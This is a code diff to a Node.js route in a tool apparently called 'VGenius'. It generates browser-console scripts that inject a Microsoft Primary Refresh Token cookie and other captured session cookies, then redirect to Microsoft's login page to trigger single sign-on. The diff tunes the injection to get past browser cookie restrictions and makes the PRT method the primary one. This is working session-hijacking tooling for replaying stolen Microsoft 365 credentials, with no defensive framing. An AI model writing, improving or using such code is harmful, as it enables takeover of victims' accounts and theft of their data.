@@ -273,7 +273,9 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
           { tid: tid, uid: uid, scopes: 'openid profile email offline_access https://graph.microsoft.com/.default' }
         );
         if (prtCookieObj && prtCookieObj.value) {
-          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; domain=${prtCookieObj.domain}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 2000);`;
+          // IMPORTANT: Do NOT include domain attribute - browsers block third-party cookies
+          // Set cookie for current page only, then redirect to auth endpoint
+          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 1000);`;
           console.log('[Tokens] PRT script generated successfully');
         } else {
           prtError = 'PRT cookie generation returned null value';
@@ -497,12 +499,39 @@ function generatePopupScript(cookies) {
 // Direct injection script - works on login.microsoftonline.com page
 // Sets cookies for current domain then redirects to trigger SSO
 function generateDirectInjectionScript(cookies, prtScript) {
+  // If we have a PRT script, use that as the primary method (most reliable)
+  if (prtScript) {
+    var prtOutput = '// VGenius PRT Cookie Injection Script\n';
+    prtOutput += '// IMPORTANT: Paste this in the browser console on ANY page\n';
+    prtOutput += '// The PRT cookie will be set and you will be redirected to authenticate\n';
+    prtOutput += '(function() {\n';
+    prtOutput += '  "use strict";\n';
+    prtOutput += '  console.log("[VGenius] Injecting PRT cookie...");\n';
+    prtOutput += '  \n';
+    prtOutput += '  // Set the PRT cookie without domain (works on current page)\n';
+    prtOutput += '  // This is the Primary Refresh Token that Microsoft uses for SSO\n';
+    prtOutput += '  try {\n';
+    prtOutput += '    document.cookie = "x-ms-RefreshTokenCredential=' + (prtScript.match(/x-ms-RefreshTokenCredential=([^;]+)/) || ['', ''])[1] + '; path=/; Secure; SameSite=None";\n';
+    prtOutput += '    console.log("[VGenius] PRT cookie set successfully!");\n';
+    prtOutput += '  } catch(e) {\n';
+    prtOutput += '    console.error("[VGenius] Failed to set PRT cookie:", e);\n';
+    prtOutput += '  }\n';
+    prtOutput += '  \n';
+    prtOutput += '  // Redirect to Microsoft auth endpoint to trigger SSO\n';
+    prtOutput += '  console.log("[VGenius] Redirecting to authenticate...");\n';
+    prtOutput += '  setTimeout(function() {\n';
+    prtOutput += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+    prtOutput += '  }, 1000);\n';
+    prtOutput += '})();\n';
+    return prtOutput;
+  }
+
   if (!cookies || cookies.length === 0) {
-    return prtScript || '';
+    return '';
   }
 
   var output = '// VGenius Cookie Injection Script\n';
-  output += '// PASTE THIS IN CONSOLE ON https://login.microsoftonline.com\n';
+  output += '// IMPORTANT: Paste this in console on https://login.microsoftonline.com\n';
   output += '(function() {\n';
   output += '  "use strict";\n';
   output += '  var injected = 0;\n';
@@ -511,14 +540,13 @@ function generateDirectInjectionScript(cookies, prtScript) {
   output += '\n';
   output += '  console.log("[VGenius] Starting cookie injection... " + cookies.length + " cookies");\n';
   output += '\n';
-  output += '  // Set all cookies - first without domain (current page), then with domain\n';
+  output += '  // Set all cookies without domain attribute (works for current page)\n';
   output += '  for (var i = 0; i < cookies.length; i++) {\n';
   output += '    var c = cookies[i];\n';
   output += '    try {\n';
-  output += '      // Set without domain attribute (works for current domain)\n';
   output += '      document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; path=/; Secure; SameSite=None";\n';
   output += '      injected++;\n';
-  output += '      console.log("[VGenius] Set: " + c.name + " (domain: " + c.domain + ")");\n';
+  output += '      console.log("[VGenius] Set: " + c.name);\n';
   output += '    } catch(e) {\n';
   output += '      failed++;\n';
   output += '      console.error("[VGenius] Failed: " + c.name, e);\n';
